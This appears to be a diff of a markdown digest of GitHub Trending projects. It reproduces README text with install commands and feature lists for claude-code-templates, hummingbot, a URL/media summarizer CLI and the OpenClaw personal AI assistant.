+npx claude-code-templates@latest --mcp database/postgresql-integration --yes What You Get Component Description Examples Agents AI specialists for specific domains Security auditor, React performance optimizer, database architect Commands Custom slash commands /generate-tests, /optimize-bundle, /check-security MCPs External service integrations GitHub, PostgreSQL, Stripe, AWS, OpenAI Settings Claude Code configurations Timeouts, memory settings, output styles Hooks Automation triggers Pre-commit validation, post-completion actions Skills Reusable capabilities with progressive disclosure PDF processing, Excel automation, custom workflows Additional Tools Beyond the template catalog, Claude Code Templates includes powerful development tools: Claude Code Analytics Monitor your AI-powered development sessions in real-time with live state detection and performance metrics. npx claude-code-templates@latest --analytics Conversation Monitor Mobile-optimized interface to view Claude responses in real-time with secure remote access. # Local access
+npx claude-code-templates@latest --chats # Secure remote access via Cloudflare Tunnel
+npx claude-code-templates@latest --chats --tunnel Health Check Comprehensive diagnostics to ensure your Claude Code installation is optimized. npx claude-code-templates@latest --health-check Plugin Dashboard View marketplaces, installed plugins, and manage permissions from a unified interface. npx claude-code-templates@latest --plugins Documentation docs.aitmpl.com - Complete guides, examples, and API reference for all components and tools. Contributing We welcome contributions! Browse existing templates to see what's available, then check our contributing guidelines to add your own agents, commands, MCPs, settings, or hooks. Please read our Code of Conduct before contributing. Attribution This collection includes components from multiple sources: Scientific Skills: K-Dense-AI/claude-scientific-skills by K-Dense Inc. - MIT License (139 scientific skills for biology, chemistry, medicine, and computational research) Official Anthropic: anthropics/skills - Official Anthropic skills (21 skills) anthropics/claude-code - Development guides and examples (10 skills) Community Skills &amp; Agents: obra/superpowers by Jesse Obra - MIT License (14 workflow skills) alirezarezvani/claude-skills by Alireza Rezvani - MIT License (36 professional role skills) wshobson/agents by wshobson - MIT License (48 agents) NerdyChefsAI Skills - Community contribution - MIT License (specialized enterprise skills) Commands &amp; Tools: awesome-claude-code by hesreallyhim - CC0 1.0 Universal (21 commands) awesome-claude-skills - Apache 2.0 (community skills) move-code-quality-skill - MIT License cocoindex-claude - Apache 2.0 Each of these resources retains its original license and attribution, as defined by their respective authors. We respect and credit all original creators for their work and contributions to the Claude ecosystem. License This project is licensed under the MIT License - see the LICENSE file for details. Links Browse Templates: aitmpl.com Documentation: docs.aitmpl.com Community: GitHub Discussions Issues: GitHub Issues Stargazers over time Found this useful? Give us a star to support the project!
+
+</div>
+
+<div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending Python">
+
+### 18. `EN` [hummingbot/hummingbot](data/articles/2c741fa5ac3137ab3777c88437f70ce8.html)
+**Source:** GitHub Trending Python | **Keyword:** `GitHub`
+Open source software that helps you create and deploy high-frequency crypto trading bots Hummingbot is an open-source framework that helps you design and deploy automated trading strategies, or bots, that can run on many centralized or decentralized exchanges. Over the past year, Hummingbot users have generated over $34 billion in trading volume across 140+ unique trading venues. The Hummingbot codebase is free and publicly available under the Apache 2.0 open-source license. Our mission is to democratize high-frequency trading by creating a global community of algorithmic traders and developers that share knowledge and contribute to the codebase. Quick Links Website and Docs: Official Hummingbot website and documentation Installation: Install Hummingbot on various platforms Discord: The main gathering spot for the global Hummingbot community YouTube: Videos that teach you how to get the most out of Hummingbot Twitter: Get the latest announcements about Hummingbot Reported Volumes: Reported trading volumes across all Hummingbot instances Newsletter: Get our newsletter whenever we ship a new release Getting Started The easiest way to get started with Hummingbot is using Docker: To install the Telegram Bot Condor, follow the instructions in the Hummingbot Docs site. To install the CLI-based Hummingbot client, follow the instructions below. Alternatively, if you are building new connectors/strategies or adding custom code, see the Install from Source section in the documentation. Install Hummingbot with Docker Install Docker Compose website. Clone the repo and use the provided docker-compose.yml file: # Clone the repository
+git clone https://github.com/hummingbot/hummingbot.git
+cd hummingbot # Run Setup &amp; Deploy
+make setup
+make deploy # Attach to the running instance
+docker attach hummingbot Install Hummingbot + Gateway DEX Middleware Gateway provides standardized connectors for interacting with automatic market maker (AMM) decentralized exchanges (DEXs) across different blockchain networks. To run Hummingbot with Gateway, clone the repo and answer y when prompted after running make setup # Clone the repository
+git clone https://github.com/hummingbot/hummingbot.git
+cd hummingbot make setup # Answer `y` when prompted
+Include Gateway? [y/N] Then run: make deploy # Attach to the running instance
+
+</div>
+
 <div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending">
 
-### 18. `EN` [steipete/summarize](data/articles/844f298b0b62ed867d1d30a587fdadad.html)
+### 19. `EN` [openclaw/openclaw](data/articles/0bd21c2cf11fc945041c46e569bfc6c6.html)
 **Source:** GitHub Trending | **Keyword:** `GitHub`
-Point at any URL/YouTube/Podcast or file. Get the gist. CLI and Chrome Extension. Summarize — Chrome Side Panel + CLI Fast summaries from URLs, files, and media. Works in the terminal, a Chrome Side Panel and Firefox Sidebar. 0.11.0 preview (unreleased): this README reflects the upcoming release. 0.11.0 preview highlights (most interesting first) Chrome Side Panel chat (streaming agent + history) inside the sidebar. YouTube slides: screenshots + OCR + transcript cards, timestamped seek, OCR/Transcript toggle. Media-aware summaries: auto‑detect video/audio vs page content. Streaming Markdown + metrics + cache‑aware status. CLI supports URLs, files, podcasts, YouTube, audio/video, PDFs. Feature overview URLs, files, and media: web pages, PDFs, images, audio/video, YouTube, podcasts, RSS. Slide extraction for video sources (YouTube/direct media) with OCR + timestamped cards. Transcript-first media flow: published transcripts when available, Whisper fallback when not. Streaming output with Markdown rendering, metrics, and cache-aware status. Local, paid, and free models: OpenAI‑compatible local endpoints, paid providers, plus an OpenRouter free preset. Output modes: Markdown/text, JSON diagnostics, extract-only, metrics, timing, and cost estimates. Smart default: if content is shorter than the requested length, we return it as-is (use --force-summary to override). Get the extension ( ) One‑click summarizer for the current tab. Chrome Side Panel + Firefox Sidebar + local daemon for streaming Markdown. Chrome Web Store: Summarize Side Panel YouTube slide screenshots (from the browser): Beginner quickstart (extension) Install the CLI (choose one): npm (cross‑platform): npm i -g @steipete/summarize Homebrew (macOS arm64): brew install steipete/tap/summarize Install the extension (Chrome Web Store link above) and open the Side Panel. The panel shows a token + install command. Run it in Terminal: summarize daemon install --token Why a daemon/service? The extension can’t run heavy extraction inside the browser. It talks to a local background service on 127.0.0.1 for fast streaming and media tools (yt‑dlp, ffmpeg, OCR, transcription). The service autostarts (launchd/systemd/Scheduled Task) so the Side Panel is always ready. If you only want the CLI, you can skip the daemon install entirely. Notes: Summarization only runs when the Side Panel is open. Auto mode summarizes on navigation (incl. SPAs); otherwise use the button. Daemon is localhost-only and requires a shared token. Autostart: macOS (launchd), Linux (systemd user), Windows (Scheduled Task). Tip: configure free via summarize refresh-free (needs OPENROUTER_API_KEY). Add --set-default to set model=free. More: Step-by-step install: apps/chrome-extension/README.md Architecture + troubleshooting: docs/chrome-extension.md Firefox compatibility notes: apps/chrome-extension/docs/firefox.md Slides (extension) Select Video + Slides in the Summarize picker. Slides render at the top; expand to full‑width cards with timestamps. Click a slide to seek the video; toggle Transcript/OCR when OCR is significant. Requirements: yt-dlp + ffmpeg for extraction; tesseract for OCR. Missing tools show an in‑panel notice. Advanced (unpacked / dev) Build + load the extension (unpacked): Chrome: pnpm -C apps/chrome-extension build chrome://extensions → Developer mode → Load unpacked Pick: apps/chrome-extension/.output/chrome-mv3 Firefox: pnpm -C apps/chrome-extension build:firefox about:debugging#/runtime/this-firefox → Load Temporary Add-on Pick: apps/chrome-extension/.output/firefox-mv3/manifest.json Open Side Panel/Sidebar → copy token. Install daemon in dev mode: pnpm summarize daemon install --token --dev CLI Install Requires Node 22+. npx (no install): npx -y @steipete/summarize "https://example.com" npm (global): npm i -g @steipete/summarize npm (library / minimal deps): npm i @steipete/summarize-core import { createLinkPreviewClient } from "@steipete/summarize-core/content"; Homebrew (custom tap): brew install steipete/tap/summarize Apple Silicon only (arm64). CLI vs extension CLI only: just install via npm/Homebrew and run summarize ... (no daemon needed). Chrome/Firefox extension: install the CLI and run summarize daemon install --token so the Side Panel can stream results and use local tools. Quickstart summarize "https://example.com" Inputs URLs or local paths: summarize "/path/to/file.pdf" --model google/gemini-3-flash-preview
-summarize "https://example.com/report.pdf" --model google/gemini-3-flash-preview
-summarize "/path/to/audio.mp3"
-summarize "/path/to/video.mp4" Stdin (pipe content using -): echo "content" | summarize -
-pbpaste | summarize -
-# binary stdin also works (PDF/image/audio/video bytes)
-cat /path/to/file.pdf | summarize - Notes: Stdin has a 50MB size limit The - argument tells summarize to read from standard input Text stdin is treated as UTF-8 text (whitespace-only input is rejected as empty) Binary stdin is preserved as raw bytes and file type is auto-detected when possible Useful for piping clipboard content or command output YouTube (supports youtube.com and youtu.be): summarize "https://youtu.be/dQw4w9WgXcQ" --youtube auto Podcast RSS (transcribes latest enclosure): summarize "https://feeds.npr.org/500005/podcast.xml" Apple Podcasts episode page: summarize "https://podcasts.apple.com/us/podcast/2424-jelly-roll/id360084272?i=1000740717432" Spotify episode page (best-effort; may fail for exclusives): summarize "https://open.spotify.com/episode/5auotqWAXhhKyb9ymCuBJY" Output length --length controls how much output we ask for (guideline), not a hard cap. summarize "https://example.com" --length long
-summarize "https://example.com" --length 20k Presets: short|medium|long|xl|xxl Character targets: 1500, 20k, 20000 Optional hard cap: --max-output-tokens (e.g. 2000, 2k) Provider/model APIs still enforce their own maximum output limits. If omitted, no max token parameter is sent (provider default). Prefer --length unless you need a hard cap. Short content: when extracted content is shorter than the requested length, the CLI returns the content as-is. Override with --force-summary to always run the LLM. Minimums: --length numeric values must be &gt;= 50 chars; --max-output-tokens must be &gt;= 16. Preset targets (source of truth: packages/core/src/prompts/summary-lengths.ts): short: target ~900 chars (range 600-1,200) medium: target ~1,800 chars (range 1,200-2,500) long: target ~4,200 chars (range 2,500-6,000) xl: target ~9,000 chars (range 6,000-14,000) xxl: target ~17,000 chars (range 14,000-22,000) What file types work? Best effort and provider-dependent. These usually work well: text/* and common structured text (.txt, .md, .json, .yaml, .xml, ...) Text-like files are inlined into the prompt for better provider compatibility. PDFs: application/pdf (provider support varies; Google is the most reliable here) Images: image/jpeg, image/png, image/webp, image/gif Audio/Video: audio/*, video/* (local audio/video files MP3/WAV/M4A/OGG/FLAC/MP4/MOV/WEBM automatically transcribed, when supported by the model) Notes: If a provider rejects a media type, the CLI fails fast with a friendly message. xAI models do not support attaching generic files (like PDFs) via the AI SDK; use Google/OpenAI/Anthropic for those. Model ids Use gateway-style ids: /. Examples: openai/gpt-5-mini anthropic/claude-sonnet-4-5 xai/grok-4-fast-non-reasoning google/gemini-3-flash-preview zai/glm-4.7 openrouter/openai/gpt-5-mini (force OpenRouter) Note: some models/providers do not support streaming or certain file media types. When that happens, the CLI prints a friendly error (or auto-disables streaming for that model when supported by the provider). Limits Text inputs over 10 MB are rejected before tokenization. Text prompts are preflighted against the model input limit (LiteLLM catalog), using a GPT tokenizer. Common flags summarize [flags] Use summarize --help or summarize help for the full help text. --model : which model to use (defaults to auto) --model auto: automatic model selection + fallback (default) --model : use a config-defined model (see Configuration) --timeout : 30s, 2m, 5000ms (default 2m) --retries : LLM retry attempts on timeout (default 1) --length short|medium|long|xl|xxl|s|m|l| --language, --lang : output language (auto = match source) --max-output-tokens : hard cap for LLM output tokens --cli [provider]: use a CLI provider (--model cli/). Supports claude, gemini, codex, agent. If omitted, uses auto selection with CLI enabled. --stream auto|on|off: stream LLM output (auto = TTY only; disabled in --json mode) --plain: keep raw output (no ANSI/OSC Markdown rendering) --no-color: disable ANSI colors --theme : CLI theme (aurora, ember, moss, mono) --format md|text: website/file content format (default text) --markdown-mode off|auto|llm|readability: HTML -&gt; Markdown mode (default readability) --preprocess off|auto|always: controls uvx markitdown usage (default auto) Install uvx: brew install uv (or https://astral.sh/uv/) --extract: print extracted content and exit (URLs only; stdin - is not supported) Deprecated alias: --extract-only --slides: extract slides for YouTube/direct video URLs and render them inline in the summary narrative (auto-renders inline in supported terminals) --slides-ocr: run OCR on extracted slides (requires tesseract) --slides-dir : base output dir for slide images (default ./slides) --slides-scene-threshold : scene detection threshold (0.1-1.0) --slides-max : maximum slides to extract (default 6) --slides-min-duration : minimum seconds between slides --json: machine-readable output with diagnostics, prompt, metrics, and optional summary --verbose: debug/diagnostics on stderr --metrics off|on|detailed: metrics output (default on) Coding CLIs (Codex, Claude, Gemini, Agent) Summarize can use common coding CLIs as local model backends: codex -&gt; --cli codex / --model cli/codex/ claude -&gt; --cli claude / --model cli/claude/ gemini -&gt; --cli gemini / --model cli/gemini/ agent (Cursor Agent CLI) -&gt; --cli agent / --model cli/agent/ Requirements: Binary installed and on PATH (or set CODEX_PATH, CLAUDE_PATH, GEMINI_PATH, AGENT_PATH) Provider authenticated (codex login, claude auth, gemini login flow, agent login or CURSOR_API_KEY) Quick smoke test: printf "Summarize CLI smoke input.\nOne short paragraph. Reply can be brief.\n" &gt;/tmp/summarize-cli-smoke.txt summarize --cli codex --plain --timeout 2m /tmp/summarize-cli-smoke.txt
-summarize --cli claude --plain --timeout 2m /tmp/summarize-cli-smoke.txt
-summarize --cli gemini --plain --timeout 2m /tmp/summarize-cli-smoke.txt
-summarize --cli agent --plain --timeout 2m /tmp/summarize-cli-smoke.txt Set explicit CLI allowlist/order: { "cli": { "enabled": ["codex", "claude", "gemini", "agent"] }
-} Configure implicit auto CLI fallback: { "cli": { "autoFallback": { "enabled": true, "onlyWhenNoApiKeys": true, "order": ["claude", "gemini", "codex", "agent"] } }
-} More details: docs/cli.md Auto model ordering --model auto builds candidate attempts from built-in rules (or your model.rules overrides). CLI attempts are prepended when: cli.enabled is set (explicit allowlist/order), or implicit auto selection is active and cli.autoFallback is enabled. Default fallback behavior: only when no API keys are configured, order claude, gemini, codex, agent, and remember/prioritize last successful provider (~/.summarize/cli-state.json). Set explicit CLI attempts: { "cli": { "enabled": ["gemini"] }
-} Disable implicit auto CLI fallback: { "cli": { "autoFallback": { "enabled": false } }
-} Note: explicit --model auto does not trigger implicit auto CLI fallback unless cli.enabled is set. Website extraction (Firecrawl + Markdown) Non-YouTube URLs go through a fetch -&gt; extract pipeline. When direct fetch/extraction is blocked or too thin, --firecrawl auto can fall back to Firecrawl (if configured). --firecrawl off|auto|always (default auto) --extract --format md|text (default text; if --format is omitted, --extract defaults to md for non-YouTube URLs) --markdown-mode off|auto|llm|readability (default readability) auto: use an LLM converter when configured; may fall back to uvx markitdown llm: force LLM conversion (requires a configured model key) off: disable LLM conversion (still may return Firecrawl Markdown when configured) Plain-text mode: use --format text. YouTube transcripts --youtube auto tries best-effort web transcript endpoints first. When captions are not available, it falls back to: Apify (if APIFY_API_TOKEN is set): uses a scraping actor (faVsWy9VTSNVIhWpR) yt-dlp + Whisper (if yt-dlp is available): downloads audio, then transcribes with local whisper.cpp when installed (preferred), otherwise falls back to OpenAI (OPENAI_API_KEY) or FAL (FAL_KEY) Environment variables for yt-dlp mode: YT_DLP_PATH - optional path to yt-dlp binary (otherwise yt-dlp is resolved via PATH) SUMMARIZE_WHISPER_CPP_MODEL_PATH - optional override for the local whisper.cpp model file SUMMARIZE_WHISPER_CPP_BINARY - optional override for the local binary (default: whisper-cli) SUMMARIZE_DISABLE_LOCAL_WHISPER_CPP=1 - disable local whisper.cpp (force remote) OPENAI_API_KEY - OpenAI Whisper transcription OPENAI_WHISPER_BASE_URL - optional OpenAI-compatible Whisper endpoint override FAL_KEY - FAL AI Whisper fallback Apify costs money but tends to be more reliable when captions exist. Slide extraction (YouTube + direct video URLs) Extract slide screenshots (scene detection via ffmpeg) and optional OCR: summarize "https://www.youtube.com/watch?v=..." --slides
-summarize "https://www.youtube.com/watch?v=..." --slides --slides-ocr Outputs are written under ./slides// (or --slides-dir). OCR results are included in JSON output (--json) and stored in slides.json inside the slide directory. When scene detection is too sparse, the extractor also samples at a fixed interval to improve coverage. When using --slides, supported terminals (kitty/iTerm/Konsole) render inline thumbnails automatically inside the summary narrative (the model inserts [slide:N] markers). Timestamp links are clickable when the terminal supports OSC-8 (YouTube/Vimeo/Loom/Dropbox). If inline images are unsupported, Summarize prints a note with the on-disk slide directory. Use --slides --extract to print the full timed transcript and insert slide images inline at matching timestamps. Format the extracted transcript as Markdown (headings + paragraphs) via an LLM: summarize "https://www.youtube.com/watch?v=..." --extract --format md --markdown-mode llm Media transcription (Whisper) Local audio/video files are transcribed first, then summarized. --video-mode transcript forces direct media URLs (and embedded media) through Whisper first. Prefers local whisper.cpp when available; otherwise requires OPENAI_API_KEY or FAL_KEY. Local ONNX transcription (Parakeet/Canary) Summarize can use NVIDIA Parakeet/Canary ONNX models via a local CLI you provide. Auto selection (default) prefers ONNX when configured. Setup helper: summarize transcriber setup Install sherpa-onnx from upstream binaries/build (Homebrew may not have a formula) Auto selection: set SUMMARIZE_ONNX_PARAKEET_CMD or SUMMARIZE_ONNX_CANARY_CMD (no flag needed) Force a model: --transcriber parakeet|canary|whisper|auto Docs: docs/nvidia-onnx-transcription.md Verified podcast services (2025-12-25) Run: summarize Apple Podcasts Spotify Amazon Music / Audible podcast pages Podbean Podchaser RSS feeds (Podcasting 2.0 transcripts when available) Embedded YouTube podcast pages (e.g. JREPodcast) Transcription: prefers local whisper.cpp when installed; otherwise uses OpenAI Whisper or FAL when keys are set. Translation paths --language/--lang controls the output language of the summary (and other LLM-generated text). Default is auto. When the input is audio/video, the CLI needs a transcript first. The transcript comes from one of these paths: Existing transcript (preferred) YouTube: uses youtubei / captionTracks when available. Podcasts: uses Podcasting 2.0 RSS (JSON/VTT) when the feed publishes it. Whisper transcription (fallback) YouTube: falls back to yt-dlp (audio download) + Whisper transcription when configured; Apify is a last resort. Prefers local whisper.cpp when installed + model available. Otherwise uses cloud Whisper (OpenAI OPENAI_API_KEY) or FAL (FAL_KEY). For direct media URLs, use --video-mode transcript to force transcribe -&gt; summarize: summarize https://example.com/file.mp4 --video-mode transcript --lang en Configuration Single config location: ~/.summarize/config.json Supported keys today: { "model": { "id": "openai/gpt-5-mini" }, "env": { "OPENAI_API_KEY": "sk-..." }, "ui": { "theme": "ember" }
-} Shorthand (equivalent): { "model": "openai/gpt-5-mini"
-} Also supported: model: { "mode": "auto" } (automatic model selection + fallback; see docs/model-auto.md) model.rules (customize candidates / ordering) models (define presets selectable via --model ) env (generic env var defaults; process env still wins) apiKeys (legacy shortcut, mapped to env names; prefer env for new configs) cache.media (media download cache: TTL 7 days, 2048 MB cap by default; --no-media-cache disables) media.videoMode: "auto"|"transcript"|"understand" slides.enabled / slides.max / slides.ocr / slides.dir (defaults for --slides) ui.theme: "aurora"|"ember"|"moss"|"mono" openai.useChatCompletions: true (force OpenAI-compatible chat completions) Note: the config is parsed leniently (JSON5), but are not allowed. Unknown keys are ignored. Media cache defaults: { "cache": { "media": { "enabled": true, "ttlDays": 7, "maxMb": 2048, "verify": "size" } }
-} Note: --no-cache bypasses summary caching only (LLM output). Extract/transcript caches still apply. Use --no-media-cache to skip media files. Precedence: --model SUMMARIZE_MODEL ~/.summarize/config.json default (auto) Theme precedence: --theme SUMMARIZE_THEME ~/.summarize/config.json (ui.theme) default (aurora) Environment variable precedence: process env ~/.summarize/config.json (env) ~/.summarize/config.json (apiKeys, legacy) Environment variables Set the key matching your chosen --model: Optional fallback defaults can be stored in config: ~/.summarize/config.json -&gt; "env": { "OPENAI_API_KEY": "sk-..." } process env always takes precedence legacy "apiKeys" still works (mapped to env names) OPENAI_API_KEY (for openai/...) NVIDIA_API_KEY (for nvidia/...) ANTHROPIC_API_KEY (for anthropic/...) XAI_API_KEY (for xai/...) Z_AI_API_KEY (for zai/...; supports ZAI_API_KEY alias) GEMINI_API_KEY (for google/...) also accepts GOOGLE_GENERATIVE_AI_API_KEY and GOOGLE_API_KEY as aliases OpenAI-compatible chat completions toggle: OPENAI_USE_CHAT_COMPLETIONS=1 (or set openai.useChatCompletions in config) UI theme: SUMMARIZE_THEME=aurora|ember|moss|mono SUMMARIZE_TRUECOLOR=1 (force 24-bit ANSI) SUMMARIZE_NO_TRUECOLOR=1 (disable 24-bit ANSI) OpenRouter (OpenAI-compatible): Set OPENROUTER_API_KEY=... Prefer forcing OpenRouter per model id: --model openrouter// Built-in preset: --model free (uses a default set of OpenRouter :free models) summarize refresh-free Quick start: make free the default (keep auto available) summarize refresh-free --set-default
-summarize "https://example.com"
-summarize "https://example.com" --model auto Regenerates the free preset (models.free in ~/.summarize/config.json) by: Fetching OpenRouter /models, filtering :free Skipping models that look very small (&lt;27B by default) based on the model id/name Testing which ones return non-empty text (concurrency 4, timeout 10s) Picking a mix of smart-ish (bigger context_length / output cap) and fast models Refining timings and writing the sorted list back If --model free stops working, run: summarize refresh-free Flags: --runs 2 (default): extra timing runs per selected model (total runs = 1 + runs) --smart 3 (default): how many smart-first picks (rest filled by fastest) --min-params 27b (default): ignore models with inferred size smaller than N billion parameters --max-age-days 180 (default): ignore models older than N days (set 0 to disable) --set-default: also sets "model": "free" in ~/.summarize/config.json Example: OPENROUTER_API_KEY=sk-or-... summarize "https://example.com" --model openrouter/meta-llama/llama-3.1-8b-instruct:free
-OPENROUTER_API_KEY=sk-or-... summarize "https://example.com" --model openrouter/minimax/minimax-m2.5 If your OpenRouter account enforces an allowed-provider list, make sure at least one provider is allowed for the selected model. When routing fails, summarize prints the exact providers to allow. Legacy: OPENAI_BASE_URL=https://openrouter.ai/api/v1 (and either OPENAI_API_KEY or OPENROUTER_API_KEY) also works. NVIDIA API Catalog (OpenAI-compatible; free credits): Set NVIDIA_API_KEY=... Optional: NVIDIA_BASE_URL=https://integrate.api.nvidia.com/v1 Credits: API Catalog trial starts with 1000 free API credits on signup (up to 5000 total via “Request More” in the API Catalog profile) Pick a model id from /v1/models (examples: fast stepfun-ai/step-3.5-flash, strong but slower z-ai/glm5) export NVIDIA_API_KEY="nvapi-..."
-summarize "https://example.com" --model nvidia/stepfun-ai/step-3.5-flash Z.AI (OpenAI-compatible): Z_AI_API_KEY=... (or ZAI_API_KEY=...) Optional base URL override: Z_AI_BASE_URL=... Optional services: FIRECRAWL_API_KEY (website extraction fallback) YT_DLP_PATH (path to yt-dlp binary for audio extraction) FAL_KEY (FAL AI API key for audio transcription via Whisper) APIFY_API_TOKEN (YouTube transcript fallback) Model limits The CLI uses the LiteLLM model catalog for model limits (like max output tokens): Downloaded from: https://raw.githubusercontent.com/BerriAI/litellm/main/model_prices_and_context_window.json Cached at: ~/.summarize/cache/ Library usage (optional) (minimal deps): @steipete/summarize-core/content @steipete/summarize-core/prompts Compatibility (pulls in CLI deps): @steipete/summarize/content @steipete/summarize/prompts Development pnpm install
-pnpm check More Docs index: docs/README.md CLI providers and config: docs/cli.md Auto model rules: docs/model-auto.md Website extraction: docs/website.md YouTube handling: docs/youtube.md Media pipeline: docs/media.md Config schema and precedence: docs/config.md Troubleshooting "Receiving end does not exist": Chrome did not inject the content script yet. Extension details -&gt; Site access -&gt; On all sites (or allow this domain) Reload the tab once. "Failed to fetch" / daemon unreachable: summarize daemon status Logs: ~/.summarize/logs/daemon.err.log License: MIT
+Your own personal AI assistant. Any OS. Any Platform. The lobster way. OpenClaw — Personal AI Assistant EXFOLIATE! EXFOLIATE! OpenClaw is a personal AI assistant you run on your own devices. It answers you on the channels you already use (WhatsApp, Telegram, Slack, Discord, Google Chat, Signal, iMessage, Microsoft Teams, WebChat), plus extension channels like BlueBubbles, Matrix, Zalo, and Zalo Personal. It can speak and listen on macOS/iOS/Android, and can render a live Canvas you control. The Gateway is just the control plane — the product is the assistant. If you want a personal, single-user assistant that feels local, fast, and always-on, this is it. Website · Docs · Vision · DeepWiki · Getting Started · Updating · Showcase · FAQ · Wizard · Nix · Docker · Discord Preferred setup: run the onboarding wizard (openclaw onboard) in your terminal. The wizard guides you step by step through setting up the gateway, workspace, channels, and skills. The CLI wizard is the path and works on macOS, Linux, and Windows (via WSL2; strongly ). Works with npm, pnpm, or bun. New install? Start here: Getting started Subscriptions (OAuth): Anthropic (Claude Pro/Max) OpenAI (ChatGPT/Codex) Model note: while any model is supported, I strongly recommend Anthropic Pro/Max (100/200) + Opus 4.6 for long‑context strength and better prompt‑injection resistance. See Onboarding. Models (selection + auth) Models config + CLI: Models Auth profile rotation (OAuth vs API keys) + fallbacks: Model failover Install ( ) Runtime: Node ≥22. npm install -g openclaw@latest
+# or: pnpm add -g openclaw@latest openclaw onboard --install-daemon The wizard installs the Gateway daemon (launchd/systemd user service) so it stays running. Quick start (TL;DR) Runtime: Node ≥22. Full beginner guide (auth, pairing, channels): Getting started openclaw onboard --install-daemon openclaw gateway --port 18789 --verbose # Send a message
+openclaw message send --to +1234567890 --message "Hello from OpenClaw" # Talk to the assistant (optionally deliver back to any connected channel: WhatsApp/Telegram/Slack/Discord/Google Chat/Signal/iMessage/BlueBubbles/Microsoft Teams/Matrix/Zalo/Zalo Personal/WebChat)
+openclaw agent --message "Ship checklist" --thinking high Upgrading? Updating guide (and run openclaw doctor). Development channels stable: tagged releases (vYYYY.M.D or vYYYY.M.D-), npm dist-tag latest. beta: prerelease tags (vYYYY.M.D-beta.N), npm dist-tag beta (macOS app may be missing). dev: moving head of main, npm dist-tag dev (when published). Switch channels (git + npm): openclaw update --channel stable|beta|dev. Details: Development channels. From source (development) Prefer pnpm for builds from source. Bun is optional for running TypeScript directly. git clone https://github.com/openclaw/openclaw.git
+cd openclaw pnpm install
+pnpm ui:build # auto-installs UI deps on first run
+pnpm build pnpm openclaw onboard --install-daemon # Dev loop (auto-reload on TS changes)
+pnpm gateway:watch Note: pnpm openclaw ... runs TypeScript directly (via tsx). pnpm build produces dist/ for running via Node / the packaged openclaw binary. Security defaults (DM access) OpenClaw connects to real messaging surfaces. Treat inbound DMs as untrusted input. Full security guide: Security Default behavior on Telegram/WhatsApp/Signal/iMessage/Microsoft Teams/Discord/Google Chat/Slack: DM pairing (dmPolicy="pairing" / channels.discord.dmPolicy="pairing" / channels.slack.dmPolicy="pairing"; legacy: channels.discord.dm.policy, channels.slack.dm.policy): unknown senders receive a short pairing code and the bot does not process their message. Approve with: openclaw pairing approve (then the sender is added to a local allowlist store). Public inbound DMs require an explicit opt-in: set dmPolicy="open" and include "*" in the channel allowlist (allowFrom / channels.discord.allowFrom / channels.slack.allowFrom; legacy: channels.discord.dm.allowFrom, channels.slack.dm.allowFrom). Run openclaw doctor to surface risky/misconfigured DM policies. Highlights Local-first Gateway — single control plane for sessions, channels, tools, and events. Multi-channel inbox — WhatsApp, Telegram, Slack, Discord, Google Chat, Signal, BlueBubbles (iMessage), iMessage (legacy), Microsoft Teams, Matrix, Zalo, Zalo Personal, WebChat, macOS, iOS/Android. Multi-agent routing — route inbound channels/accounts/peers to isolated agents (workspaces + per-agent sessions). Voice Wake + Talk Mode — always-on speech for macOS/iOS/Android with ElevenLabs. Live Canvas — agent-driven visual workspace with A2UI. First-class tools — browser, canvas, nodes, cron, sessions, and Discord/Slack actions. Companion apps — macOS menu bar app + iOS/Android nodes. Onboarding + skills — wizard-driven setup with bundled/managed/workspace skills. Star History Everything we built so far Core platform Gateway WS control plane with sessions, presence, config, cron, webhooks, Control UI, and Canvas host. CLI surface: gateway, agent, send, wizard, and doctor. Pi agent runtime in RPC mode with tool streaming and block streaming. Session model: main for direct chats, group isolation, activation modes, queue modes, reply-back. Group rules: Groups. Media pipeline: images/audio/video, transcription hooks, size caps, temp file lifecycle. Audio details: Audio. Channels Channels: WhatsApp (Baileys), Telegram (grammY), Slack (Bolt), Discord (discord.js), Google Chat (Chat API), Signal (signal-cli), BlueBubbles (iMessage, ), iMessage (legacy imsg), Microsoft Teams (extension), Matrix (extension), Zalo (extension), Zalo Personal (extension), WebChat. Group routing: mention gating, reply tags, per-channel chunking and routing. Channel rules: Channels. Apps + nodes macOS app: menu bar control plane, Voice Wake/PTT, Talk Mode overlay, WebChat, debug tools, remote gateway control. iOS node: Canvas, Voice Wake, Talk Mode, camera, screen recording, Bonjour pairing. Android node: Canvas, Talk Mode, camera, screen recording, optional SMS. macOS node mode: system.run/notify + canvas/camera exposure. Tools + automation Browser control: dedicated openclaw Chrome/Chromium, snapshots, actions, uploads, profiles. Canvas: A2UI push/reset, eval, snapshot. Nodes: camera snap/clip, screen record, location.get, notifications. Cron + wakeups; webhooks; Gmail Pub/Sub. Skills platform: bundled, managed, and workspace skills with install gating + UI. Runtime + safety Channel routing, retry policy, and streaming/chunking. Presence, typing indicators, and usage tracking. Models, model failover, and session pruning. Security and troubleshooting. Ops + packaging Control UI + WebChat served directly from the Gateway. Tailscale Serve/Funnel or SSH tunnels with token/password auth. Nix mode for declarative config; Docker-based installs. Doctor migrations, logging. How it works (short) WhatsApp / Telegram / Slack / Discord / Google Chat / Signal / iMessage / BlueBubbles / Microsoft Teams / Matrix / Zalo / Zalo Personal / WebChat │ ▼
+┌───────────────────────────────┐
+│ Gateway │
+│ (control plane) │
+│ ws://127.0.0.1:18789 │
+└──────────────┬────────────────┘ │ ├─ Pi agent (RPC) ├─ CLI (openclaw …) ├─ WebChat UI ├─ macOS app └─ iOS / Android nodes Key subsystems Gateway WebSocket network — single WS control plane for clients, tools, and events (plus ops: Gateway runbook). Tailscale exposure — Serve/Funnel for the Gateway dashboard + WS (remote access: Remote). Browser control — openclaw‑managed Chrome/Chromium with CDP control. Canvas + A2UI — agent‑driven visual workspace (A2UI host: Canvas/A2UI). Voice Wake + Talk Mode — always‑on speech and continuous conversation. Nodes — Canvas, camera snap/clip, screen record, location.get, notifications, plus macOS‑only system.run/system.notify. Tailscale access (Gateway dashboard) OpenClaw can auto-configure Tailscale Serve (tailnet-only) or Funnel (public) while the Gateway stays bound to loopback. Configure gateway.tailscale.mode: off: no Tailscale automation (default). serve: tailnet-only HTTPS via tailscale serve (uses Tailscale identity headers by default). funnel: public HTTPS via tailscale funnel (requires shared password auth). Notes: gateway.bind must stay loopback when Serve/Funnel is enabled (OpenClaw enforces this). Serve can be forced to require a password by setting gateway.auth.mode: "password" or gateway.auth.allowTailscale: false. Funnel refuses to start unless gateway.auth.mode: "password" is set. Optional: 